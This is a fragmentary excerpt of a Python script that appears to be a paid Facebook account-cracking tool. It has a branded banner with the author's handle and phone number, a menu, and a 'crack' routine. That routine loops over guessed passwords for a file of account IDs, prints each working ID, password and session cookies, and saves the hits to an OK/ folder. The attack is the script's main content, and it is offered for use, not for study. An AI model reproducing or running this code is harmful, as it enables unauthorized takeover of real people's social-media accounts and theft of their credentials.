...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/368728101298593/')
#------------------[ Ratul-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mOMOR ]\33[1;38m        ║\033[1;31m 
╠══[Facebook                 •  OMOR FARUK   ║  \033[1;97m  
╠══[Github                   • \33[1;38mOMOR-VI ]   ║\33[1;34m   
╠══[Whatsapp                 • 01603149285 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  OMOR-VAI,  Tools"')
pass
...
def menu():
    ...
    if Ratul in ['111']:
        ...
        os.system('xdg-open https://github.com/OMOR-VAI')
        os.system("python nono.py")
    elif Ratul in ['3','03']:
        result()
    elif Ratul in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/OMOR.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[OMOR•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[OMOR-VAI-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " OMOR,  Ok,  id"')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  Ratul,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
